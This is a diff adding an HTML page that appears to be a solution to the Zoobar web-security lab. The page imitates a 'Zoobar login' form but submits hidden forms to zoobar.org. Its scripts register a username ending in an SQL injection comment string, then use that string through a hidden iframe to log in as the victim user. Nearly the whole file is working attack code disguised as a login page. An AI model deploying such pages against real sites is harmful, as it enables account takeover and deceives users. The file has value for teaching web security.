@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+            registered = false
+
+            function reg(username){
+                //register fake user with sql injection string
+                //in order to acquire salt
+                dummy_user = username + "'--"
+                reg_form = document.getElementById("a")
+                reg_form.elements["login_username"].value = dummy_user
+                registered = true
+                reg_form.submit()
+            }
+
+            function login(username) {
+                //login to the desired user
+                if(registered){
+                    dummy_user = username + "'--"
+                    login_form = document.getElementById("b")
+                    login_form.elements["login_username"].value = dummy_user
+                    login_form.submit()
+                }
+            }
+        </script>
+    </head>
+    <body>
+        <h3>Zoobar login</h3>
+        <label>Username:</label>
+        <input id="user" type="text" value="" />
+        <button onclick="reg(document.getElementById('user').value)">Log In</button>
+
+        <iframe style="display:none" onload="login(document.getElementById('user').value)" name="frame"></iframe>
+
+        <!--Register form-->
+        <form id="a" style="display:none" method="POST" action="http://zoobar.org/index.php" target="frame">
+            <input type="text" name="login_username" value="" />
+            <input type="text" name="login_password" value="password" />
+            <input type="text" name="submit_registration" value="Register"/>
+        </form>
+
+        <!--Login form-->
+        <form id="b" style="display:none" method="POST" action="http://zoobar.org/index.php">
+            <input type="text" name="login_username" value=""/>
+            <input type="text" name="login_password" value="password" />
+            <input type="text" name="submit_login" value="Log In" />
+        </form>
+    </body>
+</html>
